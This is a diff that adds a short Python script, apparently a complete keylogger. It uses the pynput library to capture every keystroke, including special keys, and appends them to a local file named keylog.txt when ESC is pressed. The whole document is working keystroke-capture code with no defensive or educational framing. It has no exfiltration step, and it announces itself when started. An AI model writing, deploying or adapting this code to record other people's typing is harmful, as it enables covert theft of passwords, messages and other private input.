@@ -1,0 +1,36 @@
+from pynput.keyboard import Key, Listener
+
+# Global variables
+log_file = "keylog.txt"
+current_keys = []
+
+def on_press(key):
+    global current_keys
+    try:
+        current_keys.append(key.char)
+    except AttributeError:
+        if key == Key.space:
+            current_keys.append(' ')
+        elif key == Key.enter:
+            current_keys.append('\n')
+        else:
+            current_keys.append(f' [{key.name}] ')
+
+def write_to_file(keys):
+    with open(log_file, "a") as f:
+        for key in keys:
+            f.write(key)
+        f.close()
+
+def on_release(key):
+    if key == Key.esc:
+        write_to_file(current_keys)
+        return False
+
+def start_keylogger():
+    with Listener(on_press=on_press, on_release=on_release) as listener:
+        listener.join()
+
+if __name__ == "__main__":
+    print("Keylogger started. Press ESC to stop.")
+    start_keylogger()
